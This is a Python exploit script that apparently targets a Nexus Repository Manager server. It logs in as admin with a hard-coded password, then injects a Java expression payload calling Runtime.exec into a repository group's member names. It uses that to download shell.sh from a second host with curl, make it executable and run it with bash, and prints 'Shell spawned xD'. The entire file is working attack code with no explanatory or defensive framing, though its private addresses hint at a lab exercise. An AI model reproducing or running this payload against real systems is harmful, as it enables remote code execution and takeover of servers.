#!/usr/bin/python3

import sys
import base64
import requests

def curl():
    URL='http://192.168.232.159:8081'
    CMD='curl http://192.168.45.5/shell.sh -o /tmp/pwned.sh'
    USERNAME='admin'
    PASSWORD='3e409e89-514c-4f9f-955e-dfa5c4083518'

    s = requests.Session()
    body = {
        'username': base64.b64encode(USERNAME.encode('utf-8')).decode('utf-8'),
        'password': base64.b64encode(PASSWORD.encode('utf-8')).decode('utf-8')
    }
    r = s.post(URL + '/service/rapture/session',data=body)
    if r.status_code != 204:
        print('Login unsuccessful')
        print(r.status_code)
        sys.exit(1)

    body = {
        'name': 'internal',
        'online': True,
        'storage': {
            'blobStoreName': 'default',
            'strictContentTypeValidation': True
        },
        'group': {
            'memberNames': [
                '$\\A{\'\'.getClass().forName(\'java.lang.Runtime\').getMethods()[6].invoke(null).exec(\''+CMD+'\')}"'
            ]
         },
    }

    r = s.post(URL + '/service/rest/beta/repositories/go/group', json=body)

def chmod():
    URL='http://192.168.232.159:8081'
    CMD='chmod +x /tmp/pwned.sh'
    USERNAME='admin'
    PASSWORD='3e409e89-514c-4f9f-955e-dfa5c4083518'

    s = requests.Session()
    print('Logging in....')
    body = {
        'username': base64.b64encode(USERNAME.encode('utf-8')).decode('utf-8'),
        'password': base64.b64encode(PASSWORD.encode('utf-8')).decode('utf-8')
    }
    r = s.post(URL + '/service/rapture/session',data=body)
    if r.status_code != 204:
        print('Login unsuccessful')
        print(r.status_code)
        sys.exit(1)
    print('Chmod executed')

    body = {
        'name': 'internal',
        'online': True,
        'storage': {
            'blobStoreName': 'default',
            'strictContentTypeValidation': True
        },
        'group': {
            'memberNames': [
                '$\\A{\'\'.getClass().forName(\'java.lang.Runtime\').getMethods()[6].invoke(null).exec(\''+CMD+'\')}"'
            ]
         },
    }

    r = s.post(URL + '/service/rest/beta/repositories/go/group', json=body)


def exec():
    URL='http://192.168.232.159:8081'
    CMD='bash /tmp/pwned.sh'
    USERNAME='admin'
    PASSWORD='3e409e89-514c-4f9f-955e-dfa5c4083518'

    s = requests.Session()
    body = {
        'username': base64.b64encode(USERNAME.encode('utf-8')).decode('utf-8'),
        'password': base64.b64encode(PASSWORD.encode('utf-8')).decode('utf-8')
    }
    r = s.post(URL + '/service/rapture/session',data=body)
    if r.status_code != 204:
        print('Login unsuccessful')
        print(r.status_code)
        sys.exit(1)
    print('Shell spawned xD')

    body = {
        'name': 'internal',
        'online': True,
        'storage': {
            'blobStoreName': 'default',
            'strictContentTypeValidation': True
        },
        'group': {
            'memberNames': [
                '$\\A{\'\'.getClass().forName(\'java.lang.Runtime\').getMethods()[6].invoke(null).exec(\''+CMD+'\')}"'
            ]
         },
    }

    r = s.post(URL + '/service/rest/beta/repositories/go/group', json=body)


curl()
chmod()
exec()
